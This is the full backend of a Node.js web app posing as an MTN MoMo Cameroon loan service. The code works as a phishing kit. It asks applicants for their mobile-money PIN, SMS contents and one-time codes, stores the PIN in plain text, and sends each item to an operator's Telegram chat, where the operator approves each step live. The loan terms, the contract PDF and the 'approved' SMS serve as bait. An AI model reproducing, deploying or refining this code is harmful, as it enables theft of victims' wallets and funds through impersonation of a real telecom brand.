'use strict';

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const PDFDocument = require('pdfkit');

const { pool, initSchema } = require('./db');
const { sendOtpEmail, sendApprovalEmail } = require('./email');

const app = express();
app.set('trust proxy', 1);

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            scriptSrcAttr: ["'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            styleSrcAttr: ["'unsafe-inline'"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:", "blob:"],
            connectSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'same-site' }
}));
app.use(compression());
app.use(morgan('combined'));
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const APP_BASE_URL = process.env.APP_BASE_URL || `http://localhost:${PORT}`;
const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret-change-me';
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;

const OTP_EXPIRY_MIN = parseInt(process.env.OTP_EXPIRY_MINUTES || '10');
const OTP_COOLDOWN = parseInt(process.env.OTP_RESEND_COOLDOWN_SECONDS || '120');
const OTP_MAX_ATTEMPTS = 5;

// ─── Rate limiters ───
const globalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, max: 300,
    standardHeaders: true, legacyHeaders: false
});
const applyLimiter = rateLimit({
    windowMs: 60 * 60 * 1000, max: 5,
    keyGenerator: r => (r.body && r.body.email) || r.ip,
    message: { ok: false, error: 'Trop de tentatives. Réessayez plus tard.' }
});
const checkLimiter = rateLimit({
    windowMs: 60 * 60 * 1000, max: 10,
    keyGenerator: r => (r.body && r.body.email) || r.ip,
    message: { ok: false, error: 'Trop de vérifications.' }
});
const cooldownLimiter = rateLimit({
    windowMs: OTP_COOLDOWN * 1000, max: 1,
    keyGenerator: r => (r.body && (r.body.sessionToken || r.body.applicationId)) || r.ip,
    message: { ok: false, error: `Veuillez patienter ${Math.floor(OTP_COOLDOWN / 60)} min.` }
});
app.use('/api/', globalLimiter);

// ─── Helpers ───
function newAppId() { return 'MTN-CM-' + crypto.randomBytes(4).toString('hex').toUpperCase(); }
function newToken(bytes = 32) { return crypto.randomBytes(bytes).toString('hex'); }
function newOtp() { return String(crypto.randomInt(100000, 999999)); }
function hashOtp(otp) { return crypto.createHash('sha256').update(otp).digest('hex'); }
function esc(t) { return String(t == null ? '' : t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
function code(t) { return '<code>' + esc(t) + '</code>'; }
function fmt(n) { return Number(n || 0).toLocaleString('en-US'); }
function xaf(n) { return 'XAF ' + fmt(n); }
function normPhone(p) { return String(p || '').replace(/\D/g, '').replace(/^237/, '').slice(0, 9); }
function maskEmail(e) {
    if (!e || e.indexOf('@') < 0) return '***';
    const [u, d] = e.split('@');
    return u.slice(0, 2) + '***@' + d;
}
function maskPhone(p) {
    if (!p || p.length < 4) return '***';
    return p.slice(0, 2) + '***' + p.slice(-3);
}
function issueSession(res, appId) {
    const token = jwt.sign({ id: appId }, SESSION_SECRET, { expiresIn: '30d' });
    res.cookie('momo_session', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 30 * 24 * 3600 * 1000,
        path: '/'
    });
}
function readSession(req) {
    try {
        const raw = req.cookies && req.cookies.momo_session;
        return raw ? jwt.verify(raw, SESSION_SECRET) : null;
    } catch (e) { return null; }
}
function requireSession(req, res, next) {
    const s = readSession(req);
    if (!s) return res.status(401).json({ ok: false, error: 'Session requise.' });
    pool.query(`SELECT * FROM applications WHERE id = $1`, [s.id])
        .then(({ rows }) => {
            if (!rows.length) return res.status(401).json({ ok: false, error: 'Session invalide.' });
            req.appRow = rows[0];
            next();
        })
        .catch(e => res.status(500).json({ ok: false, error: e.message }));
}

// ─── Telegram ───
async function tgSend(text, buttons) {
    if (!TG_TOKEN || !TG_CHAT) return;
    try {
        const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true };
        if (buttons) body.reply_markup = { inline_keyboard: buttons };
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const j = await r.json();
        if (!j.ok) console.error('TG:', j.description);
    } catch (e) { console.error('TG:', e.message); }
}

function askApproval(step, appRow) {
    const buttons = [[
        { text: '✅ APPROVE', callback_data: JSON.stringify({ a: 'Y', s: step, id: appRow.id }) },
        { text: '❌ REJECT', callback_data: JSON.stringify({ a: 'N', s: step, id: appRow.id }) }
    ]];

    const header = `🆔 ${code(appRow.id)}\n👤 ${esc(appRow.full_name)}\n📧 ${code(appRow.email)}\n📱 ${code('+237 ' + appRow.phone)}\n`;
    let body = '';

    if (step === 'application') {
        const monthly = Math.ceil(appRow.loan_amount / appRow.loan_term);
        body = `📋 <b>STEP 1/4 — LOAN APPLICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
            `\n💰 <b>${xaf(appRow.loan_amount)}</b> · ${appRow.loan_term} months\n` +
            `📊 Monthly: <b>${xaf(monthly)}</b>\n🎯 ${esc(appRow.loan_purpose)}\n\n` +
            `💼 ${esc(appRow.employment)} · ${xaf(appRow.annual_income)}/yr\n` +
            `👥 Kin: ${esc(appRow.kin_name)} ${code('+237 ' + appRow.kin_phone)}\n` +
            `📊 20%: ${appRow.has_20_percent ? '✅' : '❌'} · 📜 T&C: ✅\n\n` +
            `<b>Approve to move to SMS verification?</b>`;
    } else if (step === 'sms') {
        body = `📩 <b>STEP 2/4 — SMS VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
            `\n<b>SMS pasted by user:</b>\n<pre>${esc(appRow.sms_content || '')}</pre>\n` +
            `<b>Approve SMS to move to MoMo PIN?</b>`;
    } else if (step === 'pin') {
        body = `🔐 <b>STEP 3/4 — MoMo PIN</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
            `\n<b>PIN entered:</b> <code>${esc(appRow.momo_pin_entered || '')}</code>\n\n` +
            `<b>Approve PIN to move to OTP?</b>`;
    } else if (step === 'otp') {
        body = `🔢 <b>STEP 4/4 — OTP</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
            `\n<b>OTP entered:</b> <code>${esc(appRow.otp_entered || '')}</code>\n\n` +
            `<b>Approve OTP to finalize the loan?</b>`;
    }

    tgSend(body, buttons);
}

// ─── SMS gateway ───
async function sendSms(to, text) {
    const url = process.env.SMS_GATEWAY_URL;
    const key = process.env.SMS_GATEWAY_API_KEY;
    if (!url || !key) { console.log(`[SMS SIM] +237${to}: ${text}`); return; }
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-api-key': key },
            body: JSON.stringify({ to: '+237' + to, text })
        });
        console.log(`✅ SMS → +237${to}`);
    } catch (e) { console.error('SMS:', e.message); }
}

// ═══════════════════════════════════════════════════════════
// HEALTH & CONFIG
// ═══════════════════════════════════════════════════════════
app.get('/health', async (req, res) => {
    try { await pool.query('SELECT 1'); res.json({ ok: true, version: '3.0.0' }); }
    catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.get('/api/config', (req, res) => {
    res.json({
        ok: true, country: 'CM', currency: 'XAF',
        minLoan: 500000, maxLoan: 5000000,
        interestRate: 24, termOptions: [6, 12, 18, 24, 48],
        requiredTxPercent: 20,
        otpResendCooldownSeconds: OTP_COOLDOWN,
        supportPhone: '111', supportEmail: 'support@mtn-momo-cm.com'
    });
});

app.get('/api/terms', (req, res) => {
    res.json({ ok: true, text: `MTN MOMO CAMEROON — LOAN TERMS & CONDITIONS v1.0

1. ELIGIBILITY
   • 18+ years old
   • Active MTN MoMo Cameroon account
   • At least 20% of the loan amount in MoMo transactions this month
   • Valid next of kin
   • Verified email and phone

2. MOMO TERMS OF USE
   You agree to the MTN Mobile Money Terms of Service (Cameroon),
   MTN Privacy Policy, and MTN MoMo Fee Schedule.
   Full terms: https://www.mtn.cm/momo

3. DISBURSEMENT
   Approved loans are deposited to your MoMo wallet within 5 minutes.
   You will receive a confirmation SMS and a detailed email.

4. REPAYMENT
   Monthly instalments as agreed. Automatic deductions from MoMo wallet.
   Early repayment allowed without penalty.
   Late payments attract 5% penalty per month.

5. DEFAULT
   Failure to repay within 30 days triggers default.
   Legal action may be taken. Negative credit bureau listing.

6. DATA PROTECTION
   Processed per Law No. 2010/012 on Cybersecurity in Cameroon.

7. COOLING-OFF
   You may cancel within 5 business days of approval without penalty.

8. DISPUTE RESOLUTION
   Governed by Cameroonian law. COBAC / National Consumer Tribunal.
   Contact: support@mtn-momo-cm.com

© 2026 MTN Mobile Money Cameroon` });
});

// ═══════════════════════════════════════════════════════════
// FLOW 1 — FIRST-TIME APPLICATION
// ═══════════════════════════════════════════════════════════

// POST /api/apply — Create application, send Telegram approval
app.post('/api/apply', applyLimiter, async (req, res) => {
    try {
        const b = req.body || {};
        const fullName = String(b.fullName || '').trim();
        const email = String(b.email || '').trim().toLowerCase();
        const phone = normPhone(b.phone);
        const momoPin = String(b.momoPin || '').trim();
        const loanType = String(b.loanType || '').trim();
        const loanAmount = Number(b.loanAmount);
        const loanTerm = Number(b.loanTerm);
        const loanPurpose = String(b.loanPurpose || '').trim();
        const employment = String(b.employment || '').trim();
        const annualIncome = Number(b.annualIncome);
        const kinName = String(b.kinName || '').trim();
        const kinPhone = normPhone(b.kinPhone);

        // Validation
        if (fullName.length < 3) return res.status(400).json({ ok: false, error: 'Nom complet requis.' });
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ ok: false, error: 'Email invalide.' });
        if (!/^\d{9}$/.test(phone)) return res.status(400).json({ ok: false, error: 'Téléphone à 9 chiffres.' });
        if (!/^\d{5}$/.test(momoPin)) return res.status(400).json({ ok: false, error: 'Code PIN MoMo à 5 chiffres.' });
        if (!loanType) return res.status(400).json({ ok: false, error: 'Type de prêt requis.' });
        if (loanAmount < 500000 || loanAmount > 5000000) return res.status(400).json({ ok: false, error: 'Montant XAF 500,000–5,000,000.' });
        if (![6, 12, 18, 24, 48].includes(loanTerm)) return res.status(400).json({ ok: false, error: 'Durée invalide.' });
        if (!loanPurpose) return res.status(400).json({ ok: false, error: 'Objet requis.' });
        if (!employment) return res.status(400).json({ ok: false, error: 'Emploi requis.' });
        if (annualIncome <= 0) return res.status(400).json({ ok: false, error: 'Revenu annuel requis.' });
        if (kinName.length < 2) return res.status(400).json({ ok: false, error: 'Nom du proche requis.' });
        if (!/^\d{9}$/.test(kinPhone)) return res.status(400).json({ ok: false, error: 'Téléphone du proche invalide.' });
        if (b.has20Percent !== true) return res.status(400).json({ ok: false, error: 'Vous devez confirmer la règle des 20 %.' });
        if (b.tncAccepted !== true) return res.status(400).json({ ok: false, error: 'Vous devez accepter les Conditions.' });

        // Duplicate check
        const dup = await pool.query(
            `SELECT id FROM applications
             WHERE (email = $1 OR phone = $2)
               AND status NOT IN ('approved', 'rejected')`,
            [email, phone]
        );
        if (dup.rows.length) {
            return res.status(400).json({
                ok: false, code: 'ALREADY_APPLIED',
                error: 'Une demande est déjà en cours avec ces informations.',
                applicationId: dup.rows[0].id
            });
        }

        const id = newAppId();
        await pool.query(
            `INSERT INTO applications (
                id, full_name, email, phone, momo_pin_hash,
                loan_type, loan_amount, loan_term, loan_purpose,
                employment, annual_income, kin_name, kin_phone,
                has_20_percent, tnc_accepted_at,
                status, user_submitted
            ) VALUES (
                $1, $2, $3, $4, crypt($5, gen_salt('bf', 8)),
                $6, $7, $8, $9, $10, $11, $12, $13,
                $14, NOW(), 'application_review', TRUE
            )`,
            [id, fullName, email, phone, momoPin,
             loanType, loanAmount, loanTerm, loanPurpose,
             employment, annualIncome, kinName, kinPhone,
             true]
        );

        console.log(`✅ Application ${id} created`);
        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        await askApproval('application', full.rows[0]);

        res.json({ ok: true, applicationId: id });
    } catch (e) {
        console.error('/api/apply:', e.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// GET /api/application/:id — current state of application
app.get('/api/application/:id', async (req, res) => {
    try {
        const { rows } = await pool.query(
            `SELECT id, status, user_submitted, email, phone, full_name,
                    loan_amount, loan_term, rejection_reason
             FROM applications WHERE id = $1`,
            [req.params.id]
        );
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
        res.json({ ok: true, ...rows[0] });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// POST /api/application/submit-sms
app.post('/api/application/submit-sms', async (req, res) => {
    try {
        const id = String((req.body || {}).applicationId || '');
        const sms = String((req.body || {}).sms || '').trim();
        if (!id || !sms) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        if (sms.length < 10 || sms.length > 2000) return res.status(400).json({ ok: false, error: 'SMS invalide.' });

        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
        if (rows[0].status !== 'sms_pending' || rows[0].user_submitted) {
            return res.status(400).json({ ok: false, error: 'Étape SMS non attendue.' });
        }

        await pool.query(
            `UPDATE applications SET sms_content = $2, user_submitted = TRUE, updated_at = NOW() WHERE id = $1`,
            [id, sms]
        );
        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        await askApproval('sms', full.rows[0]);
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// POST /api/application/submit-pin
app.post('/api/application/submit-pin', async (req, res) => {
    try {
        const id = String((req.body || {}).applicationId || '');
        const pin = String((req.body || {}).pin || '').trim();
        if (!id || !/^\d{5}$/.test(pin)) return res.status(400).json({ ok: false, error: 'PIN à 5 chiffres requis.' });

        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
        if (rows[0].status !== 'pin_pending' || rows[0].user_submitted) {
            return res.status(400).json({ ok: false, error: 'Étape PIN non attendue.' });
        }

        await pool.query(
            `UPDATE applications SET momo_pin_entered = $2, user_submitted = TRUE, updated_at = NOW() WHERE id = $1`,
            [id, pin]
        );
        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        await askApproval('pin', full.rows[0]);
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// POST /api/application/submit-otp
app.post('/api/application/submit-otp', async (req, res) => {
    try {
        const id = String((req.body || {}).applicationId || '');
        const otp = String((req.body || {}).otp || '').trim();
        if (!id || !/^\d{4,6}$/.test(otp)) return res.status(400).json({ ok: false, error: 'OTP à 4–6 chiffres.' });

        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
        if (rows[0].status !== 'otp_pending' || rows[0].user_submitted) {
            return res.status(400).json({ ok: false, error: 'Étape OTP non attendue.' });
        }

        await pool.query(
            `UPDATE applications SET otp_entered = $2, user_submitted = TRUE, updated_at = NOW() WHERE id = $1`,
            [id, otp]
        );
        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        await askApproval('otp', full.rows[0]);
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// FLOW 2 — CHECK STATUS (email + phone → OTP → PIN → dashboard)
// ═══════════════════════════════════════════════════════════
app.post('/api/check-status/start', checkLimiter, async (req, res) => {
    try {
        const email = String((req.body || {}).email || '').trim().toLowerCase();
        const phone = normPhone((req.body || {}).phone);
        if (!email || !phone) return res.status(400).json({ ok: false, error: 'Email et téléphone requis.' });

        const { rows } = await pool.query(
            `SELECT id, email, full_name FROM applications
             WHERE LOWER(email) = $1 AND phone = $2 LIMIT 1`,
            [email, phone]
        );
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Aucune demande trouvée avec ces informations.' });

        const app_ = rows[0];
        const otp = newOtp();
        const token = newToken(32);

        await pool.query(
            `INSERT INTO check_status_otps (token, application_id, otp_hash, expires_at)
             VALUES ($1, $2, $3, NOW() + INTERVAL '${OTP_EXPIRY_MIN} minutes')`,
            [token, app_.id, hashOtp(otp)]
        );

        await sendOtpEmail({ to: app_.email, name: app_.full_name, otp, purpose: 'check-status' });

        res.json({
            ok: true,
            sessionToken: token,
            emailMasked: maskEmail(app_.email),
            phoneMasked: maskPhone(phone),
            message: 'Un code à 6 chiffres a été envoyé à votre email.'
        });
    } catch (e) { console.error('/check-status/start:', e.message); res.status(500).json({ ok: false, error: 'Erreur serveur.' }); }
});

app.post('/api/check-status/verify-otp', async (req, res) => {
    try {
        const token = String((req.body || {}).sessionToken || '');
        const otp = String((req.body || {}).otp || '').trim();
        if (!token || !/^\d{6}$/.test(otp)) return res.status(400).json({ ok: false, error: 'Code à 6 chiffres requis.' });

        const { rows } = await pool.query(
            `SELECT * FROM check_status_otps WHERE token = $1 AND expires_at > NOW()`,
            [token]
        );
        if (!rows.length) return res.status(400).json({ ok: false, error: 'Session expirée.' });
        const s = rows[0];
        if (s.verified) return res.json({ ok: true, next: 'pin' });
        if (s.attempts >= OTP_MAX_ATTEMPTS) return res.status(429).json({ ok: false, error: 'Trop de tentatives.' });

        if (s.otp_hash !== hashOtp(otp)) {
            await pool.query(`UPDATE check_status_otps SET attempts = attempts + 1 WHERE token = $1`, [token]);
            const left = OTP_MAX_ATTEMPTS - s.attempts - 1;
            return res.status(400).json({ ok: false, error: `Code incorrect. ${left} tentative(s).` });
        }

        await pool.query(`UPDATE check_status_otps SET verified = TRUE WHERE token = $1`, [token]);
        res.json({ ok: true, next: 'pin' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/check-status/resend-otp', cooldownLimiter, async (req, res) => {
    try {
        const token = String((req.body || {}).sessionToken || '');
        if (!token) return res.status(400).json({ ok: false, error: 'Session manquante.' });

        const { rows } = await pool.query(`SELECT * FROM check_status_otps WHERE token = $1`, [token]);
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Session introuvable.' });

        const appR = await pool.query(`SELECT email, full_name FROM applications WHERE id = $1`, [rows[0].application_id]);
        if (!appR.rows.length) return res.status(404).json({ ok: false, error: 'Demande introuvable.' });

        const otp = newOtp();
        await pool.query(
            `UPDATE check_status_otps
             SET otp_hash = $1, expires_at = NOW() + INTERVAL '${OTP_EXPIRY_MIN} minutes',
                 attempts = 0, verified = FALSE, last_sent_at = NOW()
             WHERE token = $2`,
            [hashOtp(otp), token]
        );
        await sendOtpEmail({ to: appR.rows[0].email, name: appR.rows[0].full_name, otp, purpose: 'check-status' });
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/check-status/verify-pin', async (req, res) => {
    try {
        const token = String((req.body || {}).sessionToken || '');
        const pin = String((req.body || {}).pin || '').trim();
        if (!token || !/^\d{5}$/.test(pin)) return res.status(400).json({ ok: false, error: 'PIN à 5 chiffres requis.' });

        const { rows } = await pool.query(
            `SELECT * FROM check_status_otps WHERE token = $1 AND expires_at > NOW()`,
            [token]
        );
        if (!rows.length || !rows[0].verified) return res.status(400).json({ ok: false, error: 'OTP non vérifié.' });

        const appId = rows[0].application_id;
        const check = await pool.query(
            `SELECT id FROM applications WHERE id = $1 AND momo_pin_hash = crypt($2, momo_pin_hash)`,
            [appId, pin]
        );
        if (!check.rows.length) return res.status(401).json({ ok: false, error: 'Code PIN MoMo incorrect.' });

        await pool.query(`DELETE FROM check_status_otps WHERE token = $1`, [token]);
        issueSession(res, appId);
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// SESSION & DASHBOARD
// ═══════════════════════════════════════════════════════════
app.get('/api/session', (req, res) => {
    const s = readSession(req);
    if (!s) return res.json({ ok: true, loggedIn: false });
    pool.query(`SELECT id, full_name, email, phone, status FROM applications WHERE id = $1`, [s.id])
        .then(({ rows }) => {
            if (!rows.length) return res.json({ ok: true, loggedIn: false });
            const a = rows[0];
            res.json({
                ok: true, loggedIn: true,
                user: { id: a.id, fullName: a.full_name, email: a.email, phoneMasked: maskPhone(a.phone), status: a.status }
            });
        })
        .catch(() => res.json({ ok: true, loggedIn: false }));
});

app.get('/api/dashboard', requireSession, async (req, res) => {
    try {
        const a = req.appRow;
        const monthly = Math.ceil(a.loan_amount / a.loan_term);

        const tx = await pool.query(
            `SELECT id, type, amount, description, created_at FROM transactions
             WHERE application_id = $1 ORDER BY created_at DESC LIMIT 20`,
            [a.id]
        );
        const totalRepaid = tx.rows.filter(t => t.type === 'repayment').reduce((s, t) => s + Number(t.amount), 0);

        res.json({
            ok: true,
            loan: {
                id: a.id,
                amount: a.loan_amount,
                term: a.loan_term,
                monthlyPayment: monthly,
                balance: Math.max(0, a.loan_amount - totalRepaid),
                paidSoFar: totalRepaid,
                status: a.status,
                approvedAt: a.approved_at
            },
            user: { fullName: a.full_name, email: a.email, phoneMasked: maskPhone(a.phone) },
            transactions: tx.rows
        });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.get('/api/contract-pdf', requireSession, (req, res) => {
    const a = req.appRow;
    const monthly = Math.ceil(a.loan_amount / a.loan_term);
    const doc = new PDFDocument({ size: 'A4', margin: 50 });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="momo-contract-${a.id}.pdf"`);
    doc.pipe(res);
    doc.fontSize(20).font('Helvetica-Bold').text('MTN MoMo Cameroon', { align: 'center' });
    doc.fontSize(12).font('Helvetica').fillColor('#666').text('Loan Contract', { align: 'center' });
    doc.moveDown(0.5);
    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
    doc.moveDown(1);
    const line = (l, v) => { doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true }); doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A')); };
    doc.font('Helvetica-Bold').fontSize(12).text('BORROWER'); doc.moveDown(0.3);
    line('Application ID', a.id);
    line('Full Name', a.full_name);
    line('Email', a.email);
    line('Phone', '+237 ' + a.phone);
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('LOAN'); doc.moveDown(0.3);
    line('Amount', xaf(a.loan_amount));
    line('Term', a.loan_term + ' months');
    line('Monthly', xaf(monthly));
    line('Interest', '24% per year');
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('NEXT OF KIN'); doc.moveDown(0.3);
    line('Name', a.kin_name);
    line('Phone', '+237 ' + a.kin_phone);
    doc.moveDown(1);
    doc.fontSize(9).fillColor('#888').text(`Generated ${new Date().toLocaleString('en-GB')}`, { align: 'center' });
    doc.end();
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK — 4-step admin approval
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', async (req, res) => {
    res.status(200).send('ok');
    try {
        const u = req.body || {};
        if (!u.callback_query) return;
        const q = u.callback_query;
        let data;
        try { data = JSON.parse(q.data); } catch (e) { return; }

        const { a: action, s: step, id } = data;
        const approved = action === 'Y';

        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
        if (!rows.length) return;
        const app_ = rows[0];

        // Verify the step matches current status
        const expected = { application: 'application_review', sms: 'sms_pending', pin: 'pin_pending', otp: 'otp_pending' }[step];
        if (app_.status !== expected) {
            await tgSend(`⚠️ Ignored: ${step} but current status is ${app_.status}`);
            return;
        }

        const adminName = (q.from && q.from.username) || String(q.from.id);

        if (!approved) {
            await pool.query(
                `UPDATE applications
                 SET status = 'rejected', rejection_reason = $2,
                     admin_decision_by = $3, updated_at = NOW()
                 WHERE id = $1`,
                [id, `Rejected at ${step} step.`, adminName]
            );
            await tgSend(`❌ <b>REJECTED — ${step.toUpperCase()}</b>\n🆔 ${code(id)}\n👤 ${esc(app_.full_name)}`);
        } else {
            // Advance to next step
            const nextStatus = {
                application: 'sms_pending',
                sms: 'pin_pending',
                pin: 'otp_pending',
                otp: 'approved'
            }[step];

            await pool.query(
                `UPDATE applications
                 SET status = $2, user_submitted = FALSE,
                     admin_decision_by = $3,
                     approved_at = CASE WHEN $2 = 'approved' THEN NOW() ELSE approved_at END,
                     updated_at = NOW()
                 WHERE id = $1`,
                [id, nextStatus, adminName]
            );

            if (nextStatus === 'approved') {
                const monthly = Math.ceil(app_.loan_amount / app_.loan_term);
                await pool.query(
                    `INSERT INTO transactions (application_id, type, amount, description)
                     VALUES ($1, 'disbursement', $2, 'Loan approved and disbursed')`,
                    [id, app_.loan_amount]
                );
                await sendSms(app_.phone,
                    `MTN MoMo: Your loan of XAF ${app_.loan_amount.toLocaleString()} has been approved. ` +
                    `Funds will be deposited within 5 minutes. Ref: ${app_.id}`);
                await sendApprovalEmail({
                    to: app_.email, name: app_.full_name,
                    loanAmount: app_.loan_amount, loanTerm: app_.loan_term,
                    monthly, applicationId: app_.id
                });
                await tgSend(
                    `🎉 <b>LOAN FULLY APPROVED</b>\n🆔 ${code(id)}\n` +
                    `👤 ${esc(app_.full_name)}\n💰 ${xaf(app_.loan_amount)}\n\n` +
                    `✅ SMS + Email sent to customer`
                );
            } else {
                const stepLabels = { sms_pending: 'SMS', pin_pending: 'PIN', otp_pending: 'OTP' };
                await tgSend(
                    `✅ <b>${step.toUpperCase()} APPROVED</b>\n🆔 ${code(id)}\n\n` +
                    `→ Customer moves to <b>${stepLabels[nextStatus]} step</b>`
                );
            }
        }

        await fetch(`${TG_API}/answerCallbackQuery`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: q.id, text: approved ? 'Approved' : 'Rejected' })
        }).catch(() => {});
    } catch (e) { console.error('Webhook:', e.message); }
});

// ═══════════════════════════════════════════════════════════
// SPA FALLBACK + BOOT
// ═══════════════════════════════════════════════════════════
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

(async () => {
    try { await initSchema(); }
    catch (e) { console.error('Schema init failed:', e.message); process.exit(1); }
    app.listen(PORT, '0.0.0.0', () => {
        console.log('═══════════════════════════════════════');
        console.log(`🚀 MTN MoMo Cameroon v3.0`);
        console.log(`   Port: ${PORT}`);
        console.log(`   Base URL: ${APP_BASE_URL}`);
        console.log(`   Telegram: ${TG_TOKEN ? 'set' : 'MISSING'}`);
        console.log(`   Brevo: ${process.env.BREVO_API_KEY ? 'set' : 'MISSING'}`);
        console.log('═══════════════════════════════════════');
    });
})();
